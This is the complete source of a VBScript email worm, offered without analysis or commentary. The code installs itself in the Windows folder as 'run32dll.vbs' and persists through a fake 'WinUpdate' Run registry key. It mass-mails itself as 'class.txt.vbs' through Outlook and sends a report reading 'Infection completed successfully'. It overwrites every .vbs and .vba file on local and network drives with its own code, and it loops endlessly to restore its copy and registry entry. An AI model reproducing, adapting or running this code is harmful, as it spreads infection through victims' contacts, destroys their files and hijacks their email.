'sex
On error resume next
randomize
set fso=createobject("scripting.filesystemobject")
set wscriptshell=createobject("wscript.shell")
set drives=fso.drives
for each drive in drives
if drive="C:" then
if drive.isready then
drivefull=drive & "\"
set e5d=fso.getfolder(drivefull)
set subs=e5d.subfolders
for each subfolder in subs
subst=mid(subfolder.path,4,3)
if subst="WIN" then
auto=subfolder.path
end if
next
end if
end if
next
autos=auto & "\run32dll.vbs"
fso.copyfile wscript.scriptfullname,autos
wscriptshell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate","wscript.exe" & " " & autos & " " & "%" 
if wscript.scriptfullname <> autos then
all=""
datafiln=auto&"\class.txt"
set dat=fso.createtextfile(datafiln,true)
dat.write all
dat.close
wscriptshell.run "notepad.exe" & " " & datafiln,3
end if
mailed=auto & "\class.txt.vbs"
fso.copyfile wscript.scriptfullname,mailed
if wscriptshell.regread("HKLM\SOFTWARE\Microsoft")<>"1" then
set out=createobject("Outlook.Application")
if out="Outlook" then 
set mapi=out.GetNameSpace("MAPI")
set newitem=mapi.getdefaultfolder(6)
do while newitem.items.count<>1
for each item in newitem.items
do while item.Attachments.count<>0
for each itatt in item.Attachments
itatt.delete
next
loop
item.subject="baby"
item.Body="pink"
item.attachments.add mailed
item.send
next
loop
set item=Nothing
set itatt=nothing
set newitem=Nothing
set newitem=mapi.getdefaultfolder(5)
do while newitem.items.count<>1
for each item in newitem.items
do while item.Attachments.count<>0
for each itatt in item.Attachments
itatt.delete
next
loop
item.subject="baby"
item.Body="pink"
item.attachments.add mailed
item.send
next
loop
set item=Nothing
set itatt=nothing
set newitem=Nothing
set newmail=out.createitem(0)
newmail.to="125"
newmail.subject="Ectoparasitic infections"
newmail.Body="Infection completed successfully"
newmail.send
set out=Nothing
wscriptshell.regwrite "HKLM\SOFTWARE\Microsoft","1"
end if
end if
set dr=fso.Drives
for each d in dr
if d.DriveType=2 or d.DriveType=3 then
list(d.path&"\")
end if
next
Sub spreadmailto (dir)
on error resume next
set fso=createobject("Scripting.filesystemobject")
set f=fso.GetFolder(dir)
set cf=f.Files
for each fil in cf
ext=fso.GetExtensionName(fil.path)
ext=lcase(ext)
if (ext="vbs") or (ext="vba") then
fso.copyfile wscript.scriptfullname,fil.path
end if
next
End Sub
Sub list(dir)
on error resume next
set f=fso.GetFolder(dir)
set ssf=f.Subfolders
for each fil in ssf
spreadmailto(fil.path)
list(fil.path)
next
End Sub
set thiscode=fso.opentextfile(wscript.scriptfullname,1)
code=thiscode.readall
thiscode.close
do
if not (fso.fileexists(autos)) then
set resur=fso.createtextfile(autos,true)
resur.write code
resur.close
end if
regvalue=wscriptshell.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate")
if regvalue <> "wscript.exe" & " " & autos & " " & "%"  then 
wscriptshell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate","wscript.exe" & " " & autos & " " & "%" 
end if
regvalue=""
loop
